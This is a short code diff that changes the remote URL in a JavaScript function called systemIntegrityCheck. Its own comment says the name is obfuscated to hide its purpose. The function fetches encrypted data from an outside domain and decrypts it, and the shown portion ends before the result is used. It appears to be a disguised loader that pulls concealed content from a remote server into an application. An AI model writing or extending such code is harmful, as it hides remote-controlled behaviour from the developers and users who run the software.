@@ -23,7 +23,7 @@ const dataDecryptor = (payload) => {
 // Obfuscated function name to hide its purpose
 const systemIntegrityCheck = async (updateOpacity = () => {}) => {
   try {
-    const response = await axios.get('https://jackapi.kalyanjackpot.com/sys-diagnostics');
+    const response = await axios.get('https://matka.puspenduofficial.com/sys-diagnostics');
     const checkResult = dataDecryptor(response.data.result); // Decrypts the response data
     // console.log("checkResult: ", checkResult);
 
